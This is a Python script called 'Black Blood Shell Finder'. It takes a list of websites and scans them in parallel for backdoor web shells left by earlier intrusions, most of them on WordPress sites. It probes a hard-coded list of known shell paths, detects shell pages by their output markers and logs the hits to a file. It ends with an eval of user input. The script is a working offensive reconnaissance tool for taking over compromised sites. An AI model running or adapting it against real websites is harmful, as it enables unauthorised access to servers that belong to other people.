# -*- coding: utf-8 -*-
import requests
import re
import random
import string
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN

banner = '''{}
								
Black Blood Shell Finder

\n'''.format(fg)
print(banner)
requests.urllib3.disable_warnings()

# Prompt user for file containing the target sites
file_path = input("List Website # ")

# Read target sites from the specified file
try:
    with open(file_path, 'r') as file:
        target = [i.strip() for i in file.readlines()]
except FileNotFoundError:
    exit(f'\n  [!] File not found: {file_path}')

def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

Pathlist = [
    '/wp-content/plugins/core/include.php','/ws.php','/wp-content/plugins/index.php',
    '/wp-config-sample.php','/wp-content/pm.php','/.well-known/about.php',
    '/worm0.PhP7','/alfanew.PhP7','/gawean.PhP7','/404.php','/wp.php',
    '/wp-head.php','/wp-includes/wp-class.php','/fm1.php','/alfadheat.php',
    '/M1.php','/admin.php','/wp-admin/images/admin.php','/about.php',
    '/dropdown.php','/wp-admin/dropdown.php','/wp-includes/IXR/themes.php',
    '/autoload_classmap.php','/wp-includes/ID3/wp-login.php',
    '/wp-includes/SimplePie/plugins.php','/wp-content/plugins/alfa-rex.php',
    '/wp-content/plugins/about.php','/wp-content/themes/about.php',
    '/wp-content/plugins/wp-help/admin/wp-fclass.php', '/wp-content/plugins/wp-help/index.php',
    '/wp-content/themes/travel/issue.php', '/wp-content/updraft/themes.php',
    '/wp-content/themes/intense/block-css.php?mode=upload', '/wp-content/themes/hideo/network.php',
    '/simple.php', '/chosen.php', '/wp-apxupx.php?apx=upx', '/xl2023.php', '/wp-pano.php', '/about.php'
]

class EvaiLCode:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
        }

    def URLdomain(self, site):
        if site.startswith("http://"):
            site = site.replace("http://", "")
        elif site.startswith("https://"):
            site = site.replace("https://", "")
        pattern = re.compile('(.*)/')
        while re.findall(pattern, site):
            site = re.findall(pattern, site)[0]
        return site

    def checker(self, site):
        try:
            url = "http://" + self.URLdomain(site)
            for Path in Pathlist:
                response = requests.get(url + Path, headers=self.headers, verify=False, timeout=25)
                check = response.content.decode('utf-8')
                if 'Uname:' in check or '-rw-r--r--' in check or '#block-css#' in check:
                    print(f'[SUCCESS] {url} --> {fg}[shell found]')
                    with open('shell-finder.txt', 'a') as file:
                        file.write(url + Path + "\n")
                    print("Save shell-finder.txt")
                    break
                else:
                    print(f'[FAIL] {url} --> {fr}[shell not found]')
        except Exception as e:
            print(f"Error occurred: {e}")

Control = EvaiLCode()

def phillip(site):
    Control.checker(site)

mp = Pool(50)
mp.map(phillip, target)
mp.close()
mp.join()
eval(input("Complete"))
